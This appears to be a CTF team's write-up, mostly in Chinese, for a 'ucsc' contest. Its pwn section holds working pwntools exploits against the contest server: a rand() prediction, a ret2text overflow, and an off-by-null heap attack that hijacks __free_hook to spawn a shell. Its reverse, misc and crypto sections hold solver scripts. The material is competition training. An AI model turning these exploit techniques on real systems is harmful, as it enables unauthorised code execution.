# PWN

## BoFido-ucsc | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130781.png)

随机数模拟,每次模拟三个,一共输入十次,十次都对了就给shell,甚至随机数种子可以覆盖,那就拿libc模拟

```python
from pwn import *
from ctypes import *
libc = cdll.LoadLibrary('./libc.so.6')
context.log_level='debug'
#io=process('./pwn')
io=remote("39.107.58.236",46186)
io.sendafter(b"Enter your name:",b'\x00'*0x25)
libc.srand(0)
for i in range(10):
    v10 = libc.rand() % 255
    v9 = libc.rand() % 255
    v8 = libc.rand() % 255
    io.recvuntil(b'please choose your numbers:\n')
    io.sendline(str(v10).encode()+b" "+str(v9).encode()+b" "+str(v8).encode())
io.interactive()
```

## userlogin-ucsc | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130782.png)

仍然是采用随机数作为索引,从一个表中提取0x10个字符作为password

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130783.png)

然后如果用password登录,就有一个%s的无限溢出,还提供了后门函数

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130784.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130785.png)

那就先随机数模拟拿到password,再登录,溢出,ret2text

注意栈平衡

```python
from ctypes import *
from pwn import *
#io=process('./pwn')
io=remote("39.107.58.236",48968)
libc = cdll.LoadLibrary('./libc.so.6')
key=b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"
password=b""
libc.srand(libc.time(0))
v6=63
for i in range(16):
    v5 = libc.rand() % v6
    password += key[v5].to_bytes(1, 'big')
print(password)
#gdb.attach(io)
io.sendlineafter(b"Password: ",password)
io.recvuntil(b"Note: \n")
payload=b'a'*0x28+p64(0x401265)
io.sendline(payload)
io.interactive()
```

## 疯狂复制-ucsc | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130786.png)

经典菜单堆题,其中漏洞存在于edit:

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130787.png)

很明显的off\_by\_null,由于libc版本为2.27,并不会检查prev\_size vs size,所以简单利用offbynull重叠堆块,先泄露libc再劫持\_\_free\_hook

```python
from pwn import *
#io=process('./pwn')
io=remote("39.107.58.236",43343)
libc=ELF('./libc-2.27.so')
context.log_level='debug'
def ch(Id):
    io.sendlineafter(b':',str(Id).encode())
def add(Id,size):
    ch(1)
    io.sendlineafter(b"Index: ",str(Id).encode())
    io.sendlineafter(b"Size ",str(size).encode())
def edit(Id,payload):
    ch(2)
    io.sendlineafter(b"Index: ",str(Id).encode())
    io.sendafter(b"Content: ",payload)
def show(Id):
    ch(3)
    io.sendlineafter(b"Index: ",str(Id).encode())
def free(Id):
    ch(4)
    io.sendlineafter(b"Index: ",str(Id).encode())
def bug():
    gdb.attach(io)
for i in range(8):
    add(i,0xf8)
add(8,0x38)
add(9,0xf8)
add(10,0x30)
for i in range(7):
    free(6-i)
free(7)
edit(8,b'\x00'*0x30+p64(0x140)+b'\n')
free(9)
for i in range(7):
    add(i,0xf0)
add(7,0xf0)
show(8)
io.recvuntil(b'Content: ')
base=u64(io.recv(6)+b'\x00\x00')-0x3ebca0
success("base=>"+str(hex(base)))
#-----------------------------------------------------------------------------------------------
for i in range(8):
    free(i)
add(0,0xe0)
add(1,0xe0)
edit(1,p64(0x100)+p64(0x41)+b'\n')
free(8)
fhook=base+libc.sym.__free_hook
edit(1,p64(0x100)+p64(0x41)+p64(fhook-8)+b'\n')
add(2,0x30)
add(3,0x30)
system=base+libc.sym.system
edit(3,b"/bin/sh\x00"+p64(system)+b'\n')
free(3)
io.sendline(b"cat f*")
io.interactive()
```

# REVERSE

## simplere | FINISHED - soapsama

魔改的upx壳，winhex改一下就能正常脱壳

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130788.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130789.png)

CTF改为UPX

拖入64位ida分析主函数

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130790.png)

标准的输入->加密->校验逻辑，主要加密过程为：先进行一个换表的base58编码，再将编码后的值异或于编码后的长度值（倒序输入）

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130791.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130792.png)

```plain&#x20;text
a=[  0x72, 0x7A, 0x32, 0x48, 0x34, 0x4E, 0x3F, 0x3A, 0x42, 0x33,
  0x47, 0x69, 0x75, 0x63, 0x7C, 0x7D, 0x77, 0x62, 0x65, 0x64,
  0x7B, 0x6F, 0x62, 0x50, 0x73, 0x2B, 0x68, 0x6C, 0x67, 0x47,
  0x69, 0x15, 0x42, 0x75, 0x65, 0x40, 0x76, 0x61, 0x56, 0x41,
  0x11, 0x44, 0x7F, 0x19, 0x65, 0x4C, 0x40, 0x48, 0x65, 0x60,
  0x01, 0x40, 0x50, 0x01, 0x61, 0x6F, 0x69, 0x57]
enc=[0]*58
for i in range(len(a)):
    enc[len(a)-1-i]=(a[i]^(i+1))
for i in enc:
    print(hex(i)[2:],end='')
   # 6d505756376574325254786f624835546e3869714753644657633576597a7073316a4875796e707670666d736d78654c394b323848314c317873
```

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130793.png)



## easy\_re | FINISHED - soapsama

无壳64位，直接拖入ida分析&#x20;

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130794.png)

程序已经实现自解密，动调到Str1被解密之后的位置直接提取出来Str1就是flag

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130795.png)



## ez\_debug | FINISHED - soapsama

无壳64位，拖入ida分析

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130796.png)

很标准的rc4，没有任何魔改，直接套脚本解密

```go
flag=[  0xF8, 0x3C, 0x7A, 0x0E, 0xEC, 0x83, 0x9B, 0x08, 0x6A, 0x5F,
  0xC8, 0x58, 0x38, 0xA8, 0x0E, 0x3F, 0x22, 0x5F, 0x1B, 0x81,
  0x39, 0x1E, 0x8A, 0xAB, 0xB1, 0xE9, 0x75, 0x64, 0x7A, 0x30,
  0x9F, 0x64, 0x90, 0xBD, 0x7B, 0xAB]
key="UCSC"
s=[]
t=[]
for i in range(256):
    s.append(i)
    t.append(ord(key[i % len(key)]))
j=0
for i in range(256):
   j=(j+s[i]+t[i])%256
   s[i],s[j]=s[j],s[i]
k=[]
i=j=0
for r in range(len(flag)):
    i=(i+1) % 256
    j=(j+s[i]) % 256
    s[i],s[j]=s[j],s[i]
    t=(s[i]+s[j]) % 256
    k.append(s[t])
for i in range(len(flag)):
    print(chr((flag[i]%256)^k[i]),end='')
```

## **re\_ez | FINISHED - soapsama**

无壳64位拖入ida

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130797.png)

根据字符串定位到主函数，F5发现出不来东西，看一下汇编，有一些没有识别出来的机器码，手动C一下

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130798.png)

之后F5就能正常看到伪代码，是rust编译的程序，有些和c不太一样的地方，一些函数我手动改了一下名，看得舒服点

前面一大段没什么用，主逻辑在这一段区域

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130799.png)

程序先进入一个循环，提示输入，将输入按照“v13 = (\*(\_BYTE \*)v18 - 0x20) ^ 3”计算并赋值给v13，先校验v13，需要在数组范围内，之后对v0进行操作，再判断是否符合题意，只要最终能让v0=3且程序不退出就是正确的输入，flag就是输入值的md5

qword数组和dword数组都可以在内存里找到，可以用BFS算法求解，为了方便，这里先解v13

```python
from collections import deque
qword_7FF6ECB80498 = [-5, 5, -1, 1]
dword_7FF6ECB8A000 = [1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1]

def find_valid_sequence():
    # 已访问位置标记为1
    queue = deque([(1, dword_7FF6ECB8A000.copy(), [])])
    while queue:
        current_v0, visited, path = queue.popleft()
        # 尝试所有可能的输入（0-3）
        for input_val in range(4):
            new_v0 = current_v0 + qword_7FF6ECB80498[input_val]
            new_path = path + [input_val]
            if 0 <= new_v0 <= 24 and visited[new_v0] == 0:
                new_visited = visited.copy()
                new_visited[new_v0] = 1
                if new_v0 == 3:
                    return new_path
                queue.append((new_v0, new_visited, new_path))
    return None  # 如果都访问到了，即无解

sequence = find_valid_sequence()
print("路径为:", sequence)
```

得到v13=\[1, 1, 1, 3, 3, 0, 0, 0]，之后再根据v13 = (\*(\_BYTE \*)v18 - 0x20) ^ 3得到v18，即输入

这里还有个坑，就是输入应该是单字符，解得的是这个字符的ASCII值，转md5的时候要用原字符转，找个在线工具转一下

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130800.png)

# Misc

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130801.png)





![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130802.png)



![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130803.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130804.png)

## 小套不是套

附件中三个文件，其中一个图片是qrcode，那就直接扫码，得到password

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130805.png)

`PassW0rd is !@#QWE123987`

第二部分是一种伪加密，用010打开就能看到

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130806.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130807.png)

在全局位处标记了02 00意味着是不需要加密的，但是在数据源目录区却标记09 08表示有加密，显然是伪加密了，把下面的09 08改动成00 08就ok了，或者说无脑使用zipcenop也能成功

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130808.png)

得到的jpg图片中，发现下面插入了段png图片，是这样分析得到的

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130809.png)

通过对png结构的研究，很轻松的判断在unknownpadding里有东西，接下来我需要把它复制出来，卡在这里了，得到的图片并不能分析出来什么用处



![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130810.png)

各种隐写我都尝试过了，然后发现了个突破点，就是之前的那个jpg文件有oursecret加密，但是我不清楚密码

## Three

part1，就用题目给的工具进行盲水印提取就好

`8f02d3e7`

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130811.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130812.png)

part2很简单，就是二进制转base64转莫斯

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130813.png)

`-CE89-4D6B-830E-`



第三部分是个流量包，将post传递的shell进行分析就行

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130814.png)

发现它读取的是pass.txt，把下面的密码一行一行尝试即可

5d0cb5695077



flag{8f02d3e7-CE89-4D6B-830E-5d0cb5695077}

## usb流量题目

一把梭真香

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130815.png)

# Crypto

## **MERGE\_ECC--ucsc** | FINISHED - Spreng

第一段，爆破

```shell
p = 8186762541745429544201163537921168767557829030115874801599552603320381728161132002130533050721684554609459754424458805702284922582219134865036743485620797
a = 1495420997701481377470828570661032998514190598989197201754979317255564287604311958150666812378959018880028977121896929545639701195491870774156958755735447
b = 5991466901412408757938889677965118882508317970919705053385317474407117921506012065861844241307270755999163280442524251782766457119443496954015171881396147
E = EllipticCurve(GF(p),[a,b])
# print(E.order())
P =  E(6053058761132539206566092359337778642106843252217768817197593657660613775577674830119685211727923302909194735842939382758409841779476679807381619373546323 , 7059796954840479182074296506322819844555365317950589431690683736872390418673951275875742138479119268529134101923865062199776716582160225918885119415223226)
Q1 = E(4408587937721811766304285221308758024881057826193901720202053016482471785595442728924925855745045433966244594468163087104593409425316538804577603801023861 , 5036207336371623412617556622231677184152618465739959524167001889273208946091746905245078901669335908442289383798546066844566618503786766455892065155724816)
Q2 = E(2656427748146837510897512086140712942840881743356863380855689945832188909581954790770797146584513962618190767634822273749569907212145053676352384889228875 , 4010263650619965046904980178893999473955022015118149348183137418914551275841596653682626506158128955577872592363930977349664669161585732323838763793957500)
Q3 = E(1836350123050832793309451054411760401335561429787905037706697802971381859410503854213212757333551949694177845513529651742217132039482986693213175074097638 , 1647556471109115097539227566131273446643532340029032358996281388864842086424490493200350147689138143951529796293632149050896423880108194903604646084656434)

Q0 = P * 114514
# key = []

# for i in range(2^20):
#     if i*P in [Q1, Q2, Q3, Q0]:
#         print(i)
#         key.append(i)
#         if len(key) == 4:
#             break
#     if i % 10000 == 0:
#         print(i)

#   651602 943532 1008061

print(1008061*P)
print(651602*P)
print(943532*P)

```

第二段，Smart攻击

```python
from Crypto.Util.number import *


p =  839252355769732556552066312852886325703283133710701931092148932185749211043
a =  166868889451291853349533652847942310373752202024350091562181659031084638450
b =  168504858955716283284333002385667234985259576554000582655928538041193311381
E = EllipticCurve(GF(p),[a,b])
P =  E(547842233959736088159936218561804098153493246314301816190854370687622130932, 259351987899983557442340376413545600148150183183773375317113786808135411950, 1)
Q =  E(52509027983019069214323702207915994504051708473855890224511139305828303028, 520507172059483331872189759719244369795616990414416040196069632909579234481, 1)

def SmartAttack(P,Q,p):
    E = P.curve()
    Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ])

    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)
    for P_Qp in P_Qps:
        if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:
            break

    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)
    for Q_Qp in Q_Qps:
        if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:
            break

    p_times_P = p*P_Qp
    p_times_Q = p*Q_Qp

    x_P,y_P = p_times_P.xy()
    x_Q,y_Q = p_times_Q.xy()

    phi_P = -(x_P/y_P)
    phi_Q = -(x_Q/y_Q)
    k = phi_Q/phi_P
    return ZZ(k)

k = SmartAttack(P, Q, p)
print(k) # 7895892011
print(k*P==Q)

```

```python
n = [1008061, 651602, 943532] 
part1=''.join([hex(i)[2:] for i in n])
part2=7895892011
flag="flag{"+str(part1)+"-"+str(part2)+"}"
print(flag)
# flag{f61bd9f152e65ac-7895892011}
```

## essential | FINISHED - Spreng

一个密码题还跟我玩混淆？

就是两个RSA而已，只不过e不一样前者是number1，后者是0xE18E。

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130816.png)

首先要找p跟q，显然，a越大，p和q就越大，这样我们就可以用二分法，在logn的时间下求出a即可。

用这个pq就直接出第一个了。

```python
from Crypto.Util.number import *
import sympy

def func(a):
    p = sympy.nextprime(13 * a)
    q = sympy.prevprime(25 * a)
    N = p * q
    return N

def binary_search(target, low, high):
    while low <= high:
        mid = low + (high - low) // 2
        print(high - low)
        if target == func(mid):
            return mid
        elif target < func(mid):
            high = mid - 1
        else:
            low = mid + 1
    return -1  # 查找失败

N = 20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947

# low = 1
# high = 2**512
# result = binary_search(N, low, high)
# if result != -1:
#     print(result)

# a = 7876724580534791771835430594434627088013471560469412207736963203935537053220379418645369259714178145931522503674390087394035229717461111762112820042426112
# p = sympy.nextprime(13 * a)
# q = sympy.prevprime(25 * a)
# print(f"p = {p}")
# print(f"q = {q}")
# assert N == p * q

c1 = 6624758244437183700228793390575387439910775985543869953485120951825790403986028668723069396276896827302706342862776605008038149721097476152863529945095435498809442643082504012461883786296234960634593997098236558840899107452647003306820097771301898479134315680273315445282673421302058215601162967617943836306076
c2 = 204384474875628990804496315735508023717499220909413449050868658084284187670628949761107184746708810539920536825856744947995442111688188562682921193868294477052992835394998910706435735040133361347697720913541458302074252626700854595868437809272878960638744881154520946183933043843588964174947340240510756356766

p = 102397419546952293033860597727650152144175130286102358700580521651161981691864932442389800376284315897109792547767071136122457986326994452907466660551539601
q = 196918114513369794295885764860865677200336789011735305193424080098388426330509485466134231492854453648288062591859752184850880742936527794052820501060652747

e1 = 6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683
e2 = 0xE18E

phi = (p - 1) * (q - 1)

d = inverse(e1, phi)
m = pow(c1, d, N)
print(long_to_bytes(m))
# b'flag{75811c6d95770d'
# flag{75811c6d95770d56092817b75f15df05}

```

第二个是phi和e不互素，用我以前的脚本套一下。

```python
from Crypto.Util.number import *
import gmpy2

def part_roots(n, c, e, p):
    # 将e约简到可逆，g为余下的因数
    def div_e(e, p):
        g = GCD(e, (p - 1))
        while GCD(e, (p - 1)) != 1:
            e //= GCD(e, (p - 1))
            g *= GCD(e, (p - 1))
        return e, g
    
    # 约简e，便于开根
    e, g = div_e(e, p)
    d = inverse(e, p - 1)
    M = pow(c, d, p)
    
    # 在有限域内开根
    R.<x> = Zmod(p)[]
    f = x ^ g - M
    return [int(i[0]) for i in f.monic().roots()]


c = 204384474875628990804496315735508023717499220909413449050868658084284187670628949761107184746708810539920536825856744947995442111688188562682921193868294477052992835394998910706435735040133361347697720913541458302074252626700854595868437809272878960638744881154520946183933043843588964174947340240510756356766

p = 102397419546952293033860597727650152144175130286102358700580521651161981691864932442389800376284315897109792547767071136122457986326994452907466660551539601
q = 196918114513369794295885764860865677200336789011735305193424080098388426330509485466134231492854453648288062591859752184850880742936527794052820501060652747
n = p*q
e = 0xE18E

res1 = part_roots(n, c, e, p)
res2 = part_roots(n, c, e, q)

for i in res1:
    for j in res2:
        m = crt([i, j], [p, q])
#         print(long_to_bytes(m))
        try:
            print(long_to_bytes(m).decode())
        except:
            pass

# 56092817b75f15df05}
```

有人看到帮我提交一下，我就不顶yolo的号了        (01:(^^ゞ)

flag{75811c6d95770d56092817b75f15df05}



## XR4 | FINISHED - Spreng

异或加密，直接把data抄一遍就解出来了

flag{c570ee41-8b09-11ef-ac4a-a4b1c1c5a2d2}    (01:(^^ゞ)





# Web

## **ezLaravel-ucsc - PureStream**

直接访问flag即可

http://39.107.58.236:46011/flag.php

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505210130817.png)
